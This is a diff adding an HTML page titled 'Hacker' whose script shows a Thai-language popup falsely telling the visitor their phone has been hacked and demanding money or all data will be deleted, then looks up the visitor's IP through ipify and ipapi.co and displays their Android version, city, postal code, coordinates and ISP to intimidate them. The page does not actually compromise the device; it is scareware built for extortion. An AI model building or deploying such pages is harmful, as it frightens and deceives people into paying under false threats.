@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+  <title>Hacker</title>
+   <script type="module" crossorigin src="js/assets-index.d6123567.js"></script>
+   
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>   
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> 
+  <style>
+    .app-loading::after {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 999999;
+      padding-left: 2px;
+      text-align: left;
+      content: "";
+      background: #fff url('/images/loading.gif?[gifHash]') no-repeat center;
+      background-size: 256px 92px;
+    }
+
+    .slider::before {
+      z-index: 1000001;
+      padding-left: 2px;
+      background-color: #24C29A;
+      width: 150%;
+      height: 200%;
+      content: "";
+      transform: translateX(-130%) skewX(-10deg);
+      transition: transform 1.2s;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+    }
+
+    .slider-end::before {
+      transform: translateX(130%);
+    }
+
+#table {
+    font-family: Arial, Helvetica, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+    font-size:13px;
+    color:#80FF00;
+    background-color:#000;
+}
+
+#table td,#table th {
+    border: 1px solid #ddd;
+    padding: 8px;
+}
+
+#table tr:nth-child(even) {
+    background-color: #1A250E
+}
+
+.no-border {
+  border: 0 !important;
+}
+
+#table td:nth-child(odd) {
+    font-weight:1000;
+}
+
+#table td:nth-child(even) {
+    font-weight:500;
+}
+
+
+#table tr:hover {
+    background-color: #000;
+}
+
+#table th {
+    padding-top: 12px;
+    padding-bottom: 12px;
+    text-align: left;
+    background-color: #80FF00;
+    color:black;
+    color: black;
+}
+body{
+    background: #000;
+}
+
+  </style>
+</head>
+
+<body>
+  <div id="app" class="app-loading slider">
+    <!--app-html-->
+  </div>
+     <table id="table">         
+     <script>
+Swal.fire({
+  title: 'คุณพลาดล่ะ !! ️',
+  iconHtml: '<img src="https://www.pngplay.com/wp-content/uploads/2/Hacker-PNG-Background.png" height="100px" width="100px"/>',
+  text:"โทรศัพท์ของคุณถูกแฮ็ก !! \n  โอนเงินมาให้ฉัน ไม่เช่นนั้นฉันจะลบข้อมูลในโทรศัพท์ ของคุณทั้งหมด",
+  customClass: {
+    icon: 'no-border'
+  }
+});
+</script>
+ <script>
+function getIP(json) {
+
+var ipad = json.ip;
+link = "https://ipapi.co/"+ipad+"/json/"
+$.getJSON(link, function(data) {
+function androidV(ua) { 
+   ua = (ua || navigator.userAgent).toLowerCase();  
+   var match = ua.match(/android\s([0-9\.]*)/i); 
+   return match ? match[1] : undefined; 
+};          document.getElementById("table").innerHTML = '<tr><th>เกี่ยวกับ</th><th>ข้อมูล</th></tr><tr><td>เวอร์ชั่น Android</td><td>'+ androidV() +'</td><tr><td>ไอพี</td><td>'+ data.ip +' </td></tr><tr><td>ประเทศ</td><td>'+ data.country_name+'</td></tr><tr><td>ภูมิภาค</td><td>'+ data.region +'</td></tr><tr><td>เมือง</td><td>'+ data.city +'</td></tr><tr><td>เมืองหลวงของประเทศ</td><td>'+ data.country_capital +'</td></tr><tr><td>รหัสไปรษณีย์</td><td>'+ data.postal +'</td></tr><tr><td>ละติจูด</td><td>'+ data.latitude +'</td></tr><tr><td>ลองติจูด</td><td>'+ data.longitude +'</td></tr><tr><td>เขตเวลา</td><td>'+ data.timezone +'</td></tr><tr><td>รหัสโทรศัพท์</td><td>'+ data.country_calling_code +'</td></tr><tr><td>สกุลเงิน</td><td>'+ data.currency_name +'</td></tr><tr><td>ผู้ให้บริการ internet</td><td>'+ data.org +'</td></tr>';
+    });
+}
+  </script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+  <script>
+    function removeLoading() {
+      const app = document.querySelector('#app');
+      app.classList.remove('app-loading');
+      app.classList.remove('slider');
+    }
+    function isDarkModule(){
+      const body = document.querySelector('body')
+      const isDark = Number((new URLSearchParams(location.search)).get('isDark')) === 0 ? true : false;
+      return isDark ? body.setAttribute("class","") : body.setAttribute("class","dark")
+    }
+    if ((new URLSearchParams(location.search)).get('source') === 'app') {
+      removeLoading()
+      isDarkModule()
+    }
+
+    const whiteListRoute = ['/play'];
+    const url = location.href.split('?')[0]
+    if (whiteListRoute.some(item => url.endsWith(item))) {
+      removeLoading()
+    }
+
+  // window.__INITIAL_STATE__ = '<vuex-state>';
+  </script>
+  <script>
+    function getCookie(cname) {
+      let name = cname + '=';
+      let ca = document.cookie.split(';');
+      for (var i = 0; i < ca.length; i++) {
+        var c = ca[i].trim();
+        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
+      }
+      return '';
+    }
+
+    let app = document.querySelector('#app');
+    if (getCookie('darkTheme') === 'true') {
+      app.classList.add('app-dark');
+    }
+
+    let lastTouchEnd = 0;  //&#26356;&#26032;&#25163;&#25351;&#24377;&#36215;&#30340;&#26102;&#38388;
+    document.documentElement.addEventListener('touchstart', function (event) {
+      //&#22810;&#26681;&#25163;&#25351;&#21516;&#26102;&#25353;&#19979;&#23631;&#24149;&#65292;&#31105;&#27490;&#40664;&#35748;&#34892;&#20026;
+      if (event.touches.length > 1) {
+        event.preventDefault();
+      }
+    });
+    document.documentElement.addEventListener('touchend', function (event) {
+      let now = (new Date()).getTime();
+      if (now - lastTouchEnd <= 300) {
+        //&#24403;&#20004;&#27425;&#25163;&#25351;&#24377;&#36215;&#30340;&#26102;&#38388;&#23567;&#20110;300&#27627;&#31186;&#65292;&#35748;&#20026;&#21452;&#20987;&#23631;&#24149;&#34892;&#20026;
+        event.preventDefault();
+      } else { // &#21542;&#21017;&#37325;&#26032;&#25163;&#25351;&#24377;&#36215;&#30340;&#26102;&#38388;
+        lastTouchEnd = now;
+      }
+    }, false);
+    //&#38459;&#27490;&#21452;&#25351;&#25918;&#22823;&#39029;&#38754;
+    document.documentElement.addEventListener('gesturestart', function (event) {
+      event.preventDefault();
+    });
+
+    window.onload = function () {
+      setTimeout(() => {
+        app.classList.add('slider-end');
+        setTimeout(() => {
+          app.classList.remove('app-loading');
+        }, 300);
+
+        // 1s&#21518;&#28165;&#25481;loading
+        // 1s&#26159;&#28369;&#21160;&#21160;&#30011;&#30340;&#26102;&#38388;&#65292;&#38656;&#35201;&#26681;&#25454;&#19978;&#38754;&#30340;&#26102;&#38388;&#21516;&#27493;
+        setTimeout(() => {
+          app.classList.remove('slider-end');
+          app.classList.remove('slider');
+        }, 500);
+      }, 1800);
+    };
+  </script>
+ 
+</body>
+
+</html>
